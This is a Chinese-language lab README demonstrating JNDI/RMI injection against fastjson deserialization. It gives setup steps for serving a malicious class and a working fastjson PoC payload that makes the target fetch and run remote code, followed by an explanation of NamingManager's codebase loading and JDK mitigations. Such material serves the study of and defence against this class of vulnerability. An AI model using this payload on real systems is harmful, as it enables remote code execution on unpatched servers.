# 使用方式
1. 编译恶意文类：javac RemoteEvilObject.java 
2. 打包：jar cvf  remote.jar  RemoteEvilObject.class
2. 运行HTTP服务器python -m SimpleHTTPServer 8086
3. 运行 JndiServer.main
4. 使用fastjson的poc即可触发漏洞
```json
{
  "aaa": {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
  "bbb": {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/anything","autoCommit":true}
}
```

# 说明
服务端将一个`ReferenceWrapper`对象绑定到`anything`上，这个对象中`Reference`指向了一个远端地址。
当客户端执行`InitialContext.lookup()`时，会进入`com.sun.jndi.rmi.registry.RegistryContext.decodeObject`，
进而执行`NamingManager.getObjectInstance`获取`Reference`实例对象，本例中就是`RemoteEvilObject`，
进而调用`javax.naming.spi.NamingManager.getObjectFactoryFromReference()`由于本地ClassPath中没有这个类，
就会去远端下载（默认下载到的是jar包，所以需要在第2步中进行打包为jar），
下载后就会根据这个类创建对象，从而触发漏洞
```java
public class NamingManager {

    /**
     * Retrieves the ObjectFactory for the object identified by a reference,
     * using the reference's factory class name and factory codebase
     * to load in the factory's class.
     * @param ref The non-null reference to use.
     * @param factoryName The non-null class name of the factory.
     * @return The object factory for the object identified by ref; null
     * if unable to load the factory.
     */
    static ObjectFactory getObjectFactoryFromReference(
        Reference ref, String factoryName)
        throws IllegalAccessException,
        InstantiationException,
        MalformedURLException {
        Class<?> clas = null;

        // 尝试从本地获取Class
        try {
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.

        // 本地ClassPath中找不到这个类，则从ref中设置的codebase中读取
        String codebase;
        if (clas == null &&
                (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {
            }
        }

        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    }
}
```
下载的调用栈信息如下
```text
sun.net.www.protocol.http.Handler.openConnection(Handler.java:62)
sun.net.www.protocol.http.Handler.openConnection(Handler.java:57)
java.net.URL.openConnection(URL.java:971)
sun.net.www.protocol.jar.JarURLConnection.<init>(JarURLConnection.java:84)
sun.net.www.protocol.jar.Handler.openConnection(Handler.java:41)
java.net.URL.openConnection(URL.java:971)
sun.misc.URLClassPath$JarLoader.getJarFile(URLClassPath.java:708)
sun.misc.URLClassPath$JarLoader.access$600(URLClassPath.java:587)
sun.misc.URLClassPath$JarLoader$1.run(URLClassPath.java:667)
sun.misc.URLClassPath$JarLoader$1.run(URLClassPath.java:660)
java.security.AccessController.doPrivileged(Native Method)
sun.misc.URLClassPath$JarLoader.ensureOpen(URLClassPath.java:659)
sun.misc.URLClassPath$JarLoader.<init>(URLClassPath.java:610)
sun.misc.URLClassPath$3.run(URLClassPath.java:362)
sun.misc.URLClassPath$3.run(URLClassPath.java:352)
java.security.AccessController.doPrivileged(Native Method)
sun.misc.URLClassPath.getLoader(URLClassPath.java:351)
sun.misc.URLClassPath.getLoader(URLClassPath.java:328)
sun.misc.URLClassPath.getResource(URLClassPath.java:194)
java.net.URLClassLoader$1.run(URLClassLoader.java:358)
java.net.URLClassLoader$1.run(URLClassLoader.java:355)
java.security.AccessController.doPrivileged(Native Method)
java.net.URLClassLoader.findClass(URLClassLoader.java:354)
java.lang.ClassLoader.loadClass(ClassLoader.java:423)
java.net.FactoryURLClassLoader.loadClass(URLClassLoader.java:789)
java.lang.ClassLoader.loadClass(ClassLoader.java:356)
java.lang.Class.forName0(Native Method)
java.lang.Class.forName(Class.java:266)
com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:85)
javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:158) 
javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:319)
com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:456)
com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:120)
com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:203)
javax.naming.InitialContext.lookup(InitialContext.java:411)
JndiClient.main(JndiClient.java:28)
```

# 限制
利用条件如下：

1. RMI客户端的上下文环境允许访问远程Codebase。
2. 属性 java.rmi.server.useCodebaseOnly 的值必需为false。

    然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。
    当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。
    使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。

**这也是为什么RMI的方式并不是那么通用的原因**

# 参考
[关于 JNDI 注入](https://paper.seebug.org/417/)
[如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/)